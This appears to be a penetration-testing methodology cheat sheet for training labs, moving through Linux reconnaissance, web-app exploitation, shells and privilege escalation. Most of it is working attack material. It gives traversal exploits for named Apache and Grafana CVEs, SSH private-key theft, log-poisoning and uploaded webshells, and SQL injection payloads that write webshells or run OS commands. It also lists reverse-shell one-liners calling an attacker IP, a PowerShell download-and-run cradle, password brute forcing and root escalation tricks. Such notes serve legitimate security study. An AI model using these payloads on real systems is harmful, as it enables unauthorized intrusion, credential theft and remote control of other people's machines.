# Linux Methodology

Part of [[METHODOLOGY CHEAT SHEET]]. Recon → web app exploitation → shells → privilege escalation, phase-ordered.

---

### Phase 1: Reconnaissance

#### Step 1: Port Scanning
```bash
# Quick TCP scan (top 1000 ports)
nmap -v -sS -sV -Pn --top-ports 1000 -oA nmap_quick <target>

# Full TCP scan (all ports)
nmap -sT -p- --min-rate 5000 --max-retries 1 -oA nmap_full <target>

# UDP scan (top 100)
nmap -v -sU -T4 -Pn --top-ports 100 -oA nmap_udp <target>
```

**What to look for**:
- Open ports and service versions
- SSH (22) - potential weak credentials
- HTTP (80, 443) - web apps
- SMB (139, 445) - file shares
- FTP (21) - anonymous login
- SMTP (25) - user enumeration
- SNMP (161) - misconfigurations
- MySQL/PostgreSQL (3306, 5432) - default creds

#### Step 1b: DNS Enumeration
> Full walkthrough (WHOIS, Google dorking, passive OSINT, LLM-assisted wordlists): [[Information Gathering]]

```bash
# Basic record lookups
host <domain>
host -t mx <domain>
host -t txt <domain>

# Forward brute force against a wordlist
for ip in $(cat list.txt); do host $ip.<domain>; done

# Reverse brute force across a discovered IP range (negative-grep filters out the noise)
for ip in $(seq <start> <end>); do host <subnet>.$ip; done | grep -Ev "not found|timed out"

# Automated all-in-one tools
dnsrecon -d <domain> -t std
dnsenum <domain>
```
*Worth doing before or alongside port scanning, not as an afterthought, a discovered subdomain or internal hostname often reveals a whole second attack surface a plain IP-based scan would never find. Full syntax reference: [[Reconnaissance & Enumeration#DNS Enumeration|Command Appendix]].*

#### Step 1c: Vulnerability Scanning
> Full walkthrough (Nessus install/scan/analysis, Nmap NSE vuln scripts): [[Vulnerability Scanning]]

```bash
# Lightweight, targeted: NSE against whatever ports the earlier scan found open
sudo nmap -sV -p <port> --script "vuln" <target>

# Nessus: GUI-driven, heavier, broader plugin coverage (168,000+ plugins). Install/CLI
# reference: [[Reconnaissance & Enumeration#Nessus (Install & CLI)|Command Appendix]]
```
*Automated results are a starting point, never the final word, false positives and false negatives both happen. Always confirm a flagged CVE manually (`curl` the disclosed PoC, or find a matching NSE/searchsploit exploit) before treating it as confirmed.*

#### Step 2: Web Application Enumeration
> Full walkthrough (Nmap web fingerprinting, Wappalyzer, Gobuster incl. API pattern brute force, Burp Suite Proxy/Repeater/Intruder, XSS): [[Introduction to Web Application Attacks]]

```bash
# Web server fingerprinting
nmap -p80 -sV <target>
nmap -p80 --script=http-enum <target>

# Directory brute force
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,sh,cgi

# API path brute force (pattern file containing {GOBUSTER}/v1 etc.)
gobuster dir -u http://<target>:<port> -w /usr/share/wordlists/dirb/big.txt -p pattern

# Tech stack identification
whatweb http://<target>
wpscan --url http://<target> --enumerate p,vt

# robots.txt / sitemap check
curl http://<target>/robots.txt
```

**Proxy everything through Burp before manual testing:** launch with `burpsuite`, Intercept off, point the browser's manual proxy config at `127.0.0.1:8080`. Full setup + Repeater/Intruder syntax: [[Web Applications#Burp Suite|Command Appendix]].

**What to look for**:
- `/admin`, `/login`, `/dashboard`
- `robots.txt` - hidden paths
- `config.php`, `wp-config.php` - config files
- `.git` - source code exposure
- `/uploads` - file upload vulnerabilities
- `/cgi-bin` - potential RCE
- API endpoints (`/<name>/v1`, `/<name>/v2`) - probe with `curl`, watch for `405` vs `404` to confirm a path exists under a different HTTP method
- Stored/reflected XSS - test `< > ' " { } ;` in any input that gets echoed back unsanitized

#### Step 3: Service-Specific Enumeration
```bash
# SMB
enum4linux <target>
smbclient -U guest -L //<target>

# FTP
ftp <target>  # Try anonymous login

# SMTP
nc -nv <target> 25
VRFY root
EXPN mail

# SNMP
snmpwalk -c public -v1 <target>
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target>

# NFS
showmount -e <target>
mount -t nfs <target>:/share /mnt/nfs
```

---

### Phase 2: Initial Foothold

#### Step 1: Service Exploitation
```bash
# Weak credentials
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target> -t 4

# Web exploits
searchsploit <software> <version>
# Check GTFOBins for binary exploitation

# SQL injection (manual first)
sqlmap -u "http://target/page?id=1" --batch
```

#### Step 1b: Web Application Exploitation
> Full walkthrough (Directory Traversal, File Inclusion, File Upload, Command Injection): [[Common Web Application Attacks]]
> Quick symptom-to-technique lookup: [[DECISION TREE]]

```bash
# Directory Traversal / LFI probe. Swap in likely parameter names (page, file, path, template, doc...)
curl "http://<target>/index.php?page=../../../../../../../../../etc/passwd"
curl "http://<target>/index.php?page=..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"   # URL-encoded variant
curl "http://<target>/index.php?page=..\..\..\..\..\..\windows\system32\drivers\etc\hosts"  # Windows target, try backslash too

# If plain ../ 404s / gets filtered, try percent-encoding the dots. Bypasses filters matching only the literal string
curl "http://<target>/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
# Apache CVE-2021-41773/42013 specifically wants an asymmetric first segment. Try this exact pattern if the uniform one above 404s regardless of depth:
curl --path-as-is "http://<target>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# Grafana CVE-2021-43798 (any core plugin path works, alertlist always present, no auth needed)
curl http://<target>:3000/api/health   # confirm version is 8.0.0-beta1 through 8.3.0
curl --path-as-is "http://<target>:3000/public/plugins/alertlist/../../../../../../../../../../etc/passwd"

# Extract a multi-line secret (private key, cert) found via traversal. NEVER copy/paste manually, extract mechanically
curl -s "http://<target>/index.php?page=../../../../../../home/<user>/.ssh/id_rsa" -o raw_response.txt
sed -n '/-----BEGIN OPENSSH PRIVATE KEY-----/,/-----END OPENSSH PRIVATE KEY-----/p' raw_response.txt > stolen_key
chmod 400 stolen_key
ssh -i stolen_key <user>@<target>   # add -p <port> if non-standard
```

**What to look for (traversal/LFI)**:
- Any parameter whose value looks like a filename (`page=`, `file=`, `template=`, `lang=`). Classic LFI/traversal injection point
- `/etc/passwd` (Linux) or `C:\Windows\System32\drivers\etc\hosts` (Windows) to confirm the traversal works at all
- Once confirmed, hunt disclosed usernames' home directories for `.ssh/id_rsa`. Often world-readable, a direct path to a shell via SSH
- On Windows, no direct traversal-to-shell equivalent exists. Research the specific web server/framework's known sensitive file paths instead (e.g. IIS: `C:\inetpub\wwwroot\web.config`, `C:\inetpub\logs\LogFiles\W3SVC1\`)
- If a retrieved secret fails to load with a vague "unsupported"/"can't parse" error from **any** tool, suspect transcription corruption first. Re-extract mechanically and `diff` before chasing library-compatibility theories

```bash
# LFI to RCE via log poisoning (Linux, Apache). Inject a PHP snippet through a controllable header, then include the log
curl "http://<target>/index.php?page=../../../../../../../../../var/log/apache2/access.log"   # confirm User-Agent lands in the log
# In Burp Repeater: set User-Agent to <?php echo system($_GET['cmd']); ?>, send, then remove the header and re-request with:
#   page=../../../../../../../../../var/log/apache2/access.log&cmd=<command>   (URL-encode spaces as %20)
# Windows/XAMPP log path instead: xampp/apache/logs/access.log

# php://filter to read PHP source instead of executing it
curl "http://<target>/index.php?page=php://filter/convert.base64-encode/resource=<file>.php"
echo "<base64 output>" | base64 -d

# data:// wrapper, inline payload, no log/file write needed (requires allow_url_include)
curl "http://<target>/index.php?page=data://text/plain,<?php%20echo%20system('id');?>"

# RFI, host your own payload and include it remotely (also requires allow_url_include)
cd /usr/share/webshells/php/ && python3 -m http.server 80
curl "http://<target>/index.php?page=http://<your_ip>/simple-backdoor.php&cmd=id"

# Executable file upload, try direct .php first, then bypass tricks if blocked
# Case-swap extension (.pHP), alternate extensions (.phps, .php7), or upload as .txt then rename via the app
curl "http://<target>/uploads/shell.pHP?cmd=id"

# Same idea on IIS/ASP.NET: Kali ships a ready webshell, upload via the browser (ASP.NET WebForms
# viewstate tokens are fiddly to hand-craft with curl), then drive it from the browser directly
ls /usr/share/webshells/aspx/   # cmdasp.aspx
curl http://<target>/cmdasp.aspx   # confirm it landed once uploaded

# Upload + traversal combo (upload mechanism has no code-execution path at all)
# Intercept the upload in Burp, rewrite the multipart filename field to a traversal path targeting authorized_keys:
#   filename="../../../../../../../root/.ssh/authorized_keys"   (content = your own fileup.pub)
ssh-keygen -f fileup && cat fileup.pub > authorized_keys
rm ~/.ssh/known_hosts   # if the hostname was used for an earlier, different box
ssh -i fileup root@<target>   # add -p <port> if non-standard

# Command injection: identify by replacing a command-shaped parameter value entirely, then narrowing down what the filter blocks
curl -X POST --data 'param=<harmless-os-command>' http://<target>/<endpoint>   # e.g. ipconfig / id
curl -X POST --data 'param=<expected-command>' http://<target>/<endpoint>       # confirm the base command alone still works
curl -X POST --data 'param=<expected-command>%3B<injected-command>' http://<target>/<endpoint>   # %3B = URL-encoded ; chains a second command
# Also try && and (CMD only) a single &, in case ; specifically is filtered

# Detect CMD vs PowerShell on Windows (credit: PetSerAl)
# (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell    -> URL-encode and chain after the expected command

# PowerShell reverse shell via Powercat, once you know you're in a PowerShell context
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 80
# Inject (URL-encoded): IEX (New-Object System.Net.Webclient).DownloadString("http://<your_ip>/powercat.ps1");powercat -c <your_ip> -p 4444 -e powershell

# Linux reverse shell via command injection, if unfiltered enough to send it directly
# IMPORTANT: use --data-urlencode, not --data, whenever the payload contains & = or spaces
# --data sends the value raw (application/x-www-form-urlencoded), so a literal & in a reverse shell
# one-liner (>&, 0>&1) gets read as a form-field separator and silently truncates your payload
curl -X POST --data-urlencode 'Archive=bash -c "bash -i >& /dev/tcp/<your_ip>/4444 0>&1"' http://<target>/archive

# No git/command-shaped hint at all? Work through injection types systematically, watch for ANY change
# in behavior (blank/different response), not just a direct hit
curl -X POST --data 'param=1%2B1' http://<target>/<endpoint>       # eval()? expect "2" back if so
curl -X POST --data 'param={{7*7}}' http://<target>/<endpoint>     # Jinja2 SSTI? expect "49" back if so
curl -X POST --data-urlencode 'param=`id`' http://<target>/<endpoint>          # plain OS injection via backticks
curl -X POST --data-urlencode 'param=$(id)' http://<target>/<endpoint>        # or command substitution
```

**What to look for (LFI/RFI/upload/command injection)**:
- A `.php` file included via the vulnerable parameter executes rather than displays. That's the LFI/traversal distinction, use `php://filter` if you need the source instead
- `allow_url_include` gates both `data://` and RFI. If either fails outright, fall back to log poisoning
- `python3 -m http.server` serves whatever directory it was launched from. `cd` into the right folder immediately before starting it, and check its access log for a `200` (not `404`) before assuming a listener is broken
- Upload forms: try the same filename twice (an "already exists" response can brute-force server file/directory names), and check whether the `filename` field itself accepts a relative path even if the upload content can't be executed
- Sending a payload via `curl -X POST --data` and it fails/truncates for no obvious reason? Check for `&`, `=`, or spaces in it and switch to `--data-urlencode`
- Web server processes on training VMs are frequently already root/SYSTEM. Check `whoami`/`id` the moment code execution lands, before assuming you need to escalate
- Any form/parameter whose value looks like a shell command (a URL for `git clone`, a filename for a system tool, etc) is worth testing for command injection
- No obvious command-shaped hint? A response going **blank** instead of echoing your literal input back is itself a signal something got evaluated, even if the specific payload's side effect (a callback, etc) doesn't land. Don't rule out injection just because nothing visibly changed on a simple test
- `git version` output tells you Windows vs Linux in one shot (Windows appends `.windows.N` to the version string)

#### Step 1c: SQL Injection
> Full walkthrough: [[SQL Injection Attacks]]

```bash
# Connect directly to a DB (useful when creds are already known, or after finding them elsewhere)
mysql -u root -p'root' -h <target> -P 3306 --skip-ssl-verify-server-cert   # add --skip-ssl if TLS errors
impacket-mssqlclient <user>:<pass>@<target> -windows-auth

# Auth bypass in a login form's username field
offsec' OR 1=1 -- //

# Error-based enumeration (leaks values through DB error messages)
' or 1=1 in (select @@version) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //

# UNION-based: find column count first, then enumerate
' ORDER BY 1-- //                                  # increment until it errors, that's the count - 1
' UNION SELECT null,null,database(),user(),@@version -- //   # shift string values off any integer-typed column
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //

# Blind SQLi tests (no visible output; infer from behavior/timing instead)
<target>?user=offsec' AND 1=1 -- //                          # boolean-based
<target>?user=offsec' AND IF (1=1, sleep(3),'false') -- //   # time-based

# MySQL: write a webshell to disk via UNION + INTO OUTFILE (needs a writable web-servable path)
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
curl "http://<target>/tmp/webshell.php?cmd=id"

# MSSQL: enable and use xp_cmdshell
EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';

# PostgreSQL: error-based extraction via CAST() type-mismatch (leaks the value, no truncation cap)
' UNION SELECT NULL,CAST((SELECT version()) AS int),NULL-- 

# PostgreSQL: RCE, superuser only (check first: SELECT usesuper FROM pg_user).
# Needs stacked queries (works via PHP's pg_query(), not mysqli_query()) and a landing table
'; CREATE TABLE IF NOT EXISTS cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM '<command>'; -- 
' UNION SELECT NULL,CAST((SELECT string_agg(cmd_output,' | ')) AS int),NULL FROM cmd_exec-- 

# Automate with sqlmap
sqlmap -u "http://<target>/page.php?id=1" -p id                 # discovery/fingerprint
sqlmap -u "http://<target>/page.php?id=1" -p id --dump           # dump current DB
sqlmap -r post.txt -p <param> --os-shell --web-root "/var/www/html/tmp"   # full OS shell (capture POST via Burp first)
```

**What to look for (SQL injection)**:
- Any input that gets used to build a query (login forms, search boxes, IDs in a URL) is worth testing with a single `'` first, a resulting DB error confirms in-band injection
- UNION SQLi needs the same column count and compatible types, use `ORDER BY` to find the count, then a `UNION SELECT` of dummy string values to see which columns actually render
- A column that silently doesn't display (rather than erroring) is often an integer-typed column rejecting a string value, shift your enumeration functions to a different column
- No visible output difference at all doesn't mean it's not injectable, boolean/time-based blind SQLi infers results from behavior or timing instead (same "blank response is still a signal" idea as command injection above)
- sqlmap is loud, avoid it on stealth-sensitive engagements
- `INTO OUTFILE` (MySQL), `xp_cmdshell` (MSSQL), and `COPY ... FROM PROGRAM` (PostgreSQL, superuser only) are the three DBMS-specific paths from SQLi to OS command execution seen so far, sqlmap's `--os-shell` automates the MySQL one
- PostgreSQL backends via PHP's `pg_query()` allow stacked (`;`-separated) queries in a single call, unlike MySQL's `mysqli_query()`, which needs `mysqli_multi_query()` explicitly, worth checking for this whenever the backend is confirmed Postgres

#### Step 1d: Phishing (Credential Capture)
> The technique (clone a login page, patch it, capture credentials) is genuinely OS-agnostic, it targets the person, not the target machine's OS, so the full writeup lives once in [[Windows Methodology#Step 1c: Phishing (Credential Capture)|Windows Methodology's Step 1c]] rather than being duplicated here. Full walkthrough: [[Phishing Basics]].

#### Step 2: Shells & Payloads

**Netcat**:
```bash
# Reverse shell
nc <attacker_ip> 4444 -e /bin/bash

# Attacker listener
rlwrap nc -nlvp 4444
```

**Bash**:
```bash
bash -c "bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1"
```

**Python**:
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**PHP**:
```php
<?php echo shell_exec("/bin/bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1");?>
```

**MSFVenom**:
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf
./shell.elf
```

#### Step 3: Upgrade Shell
```bash
# TTY shell
python -c 'import pty;pty.spawn("/bin/bash");'

# Full TTY
# Press Ctrl+Z
stty raw -echo
fg
export TERM=xterm-256color
```

---

### Phase 3: Privilege Escalation

#### Step 1: Quick Enumeration
```bash
# Current user info
id
whoami
groups
sudo -l

# System info
uname -a
cat /etc/issue
cat /etc/os-release

# Users
cat /etc/passwd
cat /etc/shadow  # if root

# Network
ip a
netstat -tulpn
ss -tulpn

# Processes
ps auxf
ps -eo pid,user,command
```

#### Step 2: Automated Enumeration
```bash
# LinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Linux Smart Enumeration
wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
chmod +x lse.sh
./lse.sh
```

#### Step 3: Common Privilege Escalation Vectors

**SUID Binaries**:
```bash
find / -perm -u=s -type f 2>/dev/null

# Check GTFOBins for each binary
# Example: find
find . -exec /bin/sh -p \; -quit

# Example: bash
bash -p

# Example: python
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Capabilities**:
```bash
getcap -r / 2>/dev/null

# Exploit cap_setuid
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Sudo Misconfigurations**:
```bash
sudo -l

# Common exploits:
# git
sudo git help config
!/bin/bash

# less
sudo less /etc/hosts
!/bin/bash

# vim
sudo vim
:!/bin/bash

# apt-get
sudo apt-get changelog apt
!/bin/sh

# find
sudo find / -exec /bin/sh \;
```

**Cron Jobs**:
```bash
ls -la /etc/cron*
crontab -l
cat /etc/crontab

# Writable cron scripts
find /etc/cron* -writable 2>/dev/null
```

**/etc/passwd Writeable**:
```bash
openssl passwd w00t
echo "root2:hash:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
```

**Kernel Exploits**:
```bash
uname -a
searchsploit linux kernel <version>
# Compile and run (test in sandbox first!)
```
